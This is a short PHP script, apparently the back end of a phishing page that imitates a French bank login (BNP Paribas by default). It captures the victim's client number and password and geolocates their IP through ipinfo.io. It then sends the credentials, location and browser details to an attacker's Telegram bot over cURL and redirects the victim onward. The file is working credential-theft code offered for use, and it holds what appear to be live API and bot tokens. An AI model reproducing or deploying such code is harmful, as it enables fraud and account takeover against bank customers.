<?php
// 1. Récupération des données du formulaire
$login = $_POST['login'] ?? '';
$motdepasse = $_POST['motdepasse'] ?? '';
$bank = $_POST['bank'] ?? 'BNP PARISBAS';

// 2. Récupérer l'IP (en tenant compte des proxies)
$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];

// 3. Géolocalisation avec ipinfo.io (avec votre token)
$geoInfo = json_decode(file_get_contents("https://ipinfo.io/{$ip}/json?token=3416ceaf95a319"), true);

// 4. Date et heure précises avec fuseau horaire
$timezone = $geoInfo['timezone'] ?? 'Europe/Paris'; // Fallback sur Paris si inconnu
date_default_timezone_set($timezone);
$currentTime = date('H:i:s');
$currentDate = date('d/m/Y');
$timestamp = time();

// 5. Construire le message Telegram enrichi
$message = "
🏦 NOUVELLE CONNEXION {$bank}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ DATE ET HEURE:
📅 Date: {$currentDate}
🕒 Heure: {$currentTime}
⏱ Timestamp: {$timestamp}
🌐 Fuseau: {$timezone}

🔐 DONNÉES DE CONNEXION:
👤 Numéro Client: {$login}
🔑 Mot de Passe: {$motdepasse}

📍 GÉOLOCALISATION:
🌍 IP: {$ip}
🏙️ Ville: " . ($geoInfo['city'] ?? 'Inconnue') . "
📌 Pays: " . ($geoInfo['country'] ?? 'Inconnu') . "
🗺️ Région: " . ($geoInfo['region'] ?? 'Inconnue') . "

💻 INFOS APPAREIL:
🖥️ User-Agent: " . ($_SERVER['HTTP_USER_AGENT'] ?? 'Inconnu') . "
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
";

// 6. Envoi à Telegram avec cURL
$telegramToken = "7749490498:AAHVQ5yVLBT1vFuulMXDe6GqA7K9pVk5YWs";
$telegramChatId = "7796457959";

$url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
$data = [
    'chat_id' => $telegramChatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

// 7. Redirection vers votre URL
header("Location: ../final.php");
exit;
?>